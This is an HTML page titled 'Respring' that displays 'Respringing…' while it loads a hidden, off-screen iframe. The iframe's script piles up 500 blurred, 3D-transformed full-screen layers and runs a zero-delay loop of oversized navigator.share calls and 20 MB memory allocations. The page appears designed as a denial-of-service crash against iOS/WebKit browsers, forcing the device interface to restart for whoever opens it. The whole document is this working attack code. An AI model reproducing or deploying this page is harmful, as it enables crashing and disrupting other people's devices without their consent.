<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Respring</title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    background: #0b0b10;
    color: #f4f4f8;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, sans-serif;
    height: 100%;
    overflow: hidden;
  }
  .wrap {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 24px;
  }
  .status {
    font-size: 1.05rem;
    font-weight: 600;
    letter-spacing: 0.01em;
  }
  .respring-frame {
    position: fixed;
    left: -10000px;
    top: -10000px;
    width: 1px;
    height: 1px;
    opacity: 0;
    pointer-events: none;
    border: 0;
  }
</style>
</head>
<body>
<div class="wrap"><div class="status">Respringing&hellip;</div></div>
<script>
(function () {
  var frame = document.createElement('iframe');
  frame.className = 'respring-frame';
  frame.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
  frame.srcdoc = [
    '<!doctype html><html><body style="margin:0;overflow:hidden;">',
    '<script>',
    'var container=document.createElement("div");',
    'container.style.cssText="perspective:1px;perspective-origin:9999999% 9999999%;";',
    'document.body.appendChild(container);',
    'for(var i=0;i<500;i++){',
    'var d=document.createElement("div");',
    'd.style.cssText="position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,"+i+"px) rotateY(90deg);opacity:0.99;";',
    'container.appendChild(d);',
    '}',
    'setInterval(function(){',
    'try{navigator.share({title:"R",text:"R".repeat(100000)});}catch(e){}',
    'var x=new Uint8Array(1024*1024*20);',
    'crypto.getRandomValues(x);',
    '},0);',
    '<\/script>',
    '</body></html>'
  ].join('');
  document.body.appendChild(frame);
})();
</script>
</body>
</html>
